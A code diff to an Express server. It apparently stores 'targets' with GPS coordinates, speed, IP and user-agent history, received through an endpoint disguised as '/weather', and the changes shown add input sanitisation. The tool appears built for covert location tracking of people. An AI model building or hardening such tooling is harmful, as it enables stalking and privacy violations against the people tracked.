@@ -3,26 +3,13 @@ const router = express.Router()
 const config = require("./config")
 
 // In-memory store for targets
-// Structure:
-// TARGETS[id] = {
-//   id: string,
-//   lat: number,
-//   lng: number,
-//   accuracy: number | null,
-//   speed: number | null,
-//   lastSeen: number, // epoch ms
-//   firstSeen: number,
-//   ip: string,
-//   userAgent: string,
-//   history: [ { lat, lng, time, accuracy, speed } ]
-// }
 const TARGETS = {}
 const MAX_HISTORY_POINTS = 200
 
 // Login Page
 router.route("/login")
     .get((req, res) => {
-        res.render("login")
+        res.render("login", { error: null })
     })
     .post((req, res) => {
         const { username, password } = req.body
@@ -52,11 +39,15 @@ router.route("/weather")
     .post((req, res) => {
         let { id, lat, lng, accuracy, speed } = req.body
 
-        // Validation
+        // Validation & Sanitization
         if (!id || typeof id !== "string") {
             return res.status(400).send("Invalid Target ID")
         }
-        id = id.trim().slice(0, 32)
+        // Sanitize ID: only letters, digits, underscores, hyphens, and dots
+        id = id.trim().replace(/[^a-zA-Z0-9_\-\.]/g, "").slice(0, 32)
+        if (!id) {
+            id = "target_" + Date.now()
+        }
 
         const numLat = parseFloat(lat)
         const numLng = parseFloat(lng)
@@ -64,8 +55,8 @@ router.route("/weather")
             return res.status(400).send("Invalid Coordinates")
         }
 
-        const numAccuracy = accuracy != null ? parseFloat(accuracy) : null
-        const numSpeed = speed != null ? parseFloat(speed) : null
+        const numAccuracy = (accuracy != null && !isNaN(parseFloat(accuracy))) ? Math.max(0, parseFloat(accuracy)) : null
+        const numSpeed = (speed != null && !isNaN(parseFloat(speed))) ? Math.max(0, parseFloat(speed)) : null
         const now = Date.now()
 
         const isNew = !TARGETS[id]
